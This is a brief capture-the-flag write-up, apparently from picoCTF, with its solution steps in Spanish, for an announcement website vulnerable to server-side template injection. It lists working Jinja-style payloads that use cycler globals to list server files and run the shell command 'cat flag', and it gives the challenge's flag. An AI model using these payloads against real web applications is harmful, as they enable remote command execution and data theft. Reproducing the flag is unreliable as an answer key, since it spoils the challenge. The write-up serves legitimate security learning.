**Challenge**
	
**Description**
	I made a cool website where you can announce whatever you want! Try it out!
	I heard templating is a cool and modular way to build web apps!
	Check out my website [here](http://rescued-float.picoctf.net:61845/)!
	**Hints**
		1. Server Side Template Injection

**Solution**
	1. Se detecta posible vulnerabilidad probando entrada:
		{{config}}
		Se muestra información y se confirma **SSTI**
	2. Se accede a funciones internas usando `cycler`:
		{{ cycler.__init__.__globals__.os.listdir('.') }}
		Lista archivos del servidor:	['app.py', '__pycache__', 'flag', 'requirements.txt']
	3. Se identifica el archivo importante (`flag`) y se lee:
		{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
	4. Se obtiene la bandera: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}`.

**Notes**
	

**References**
	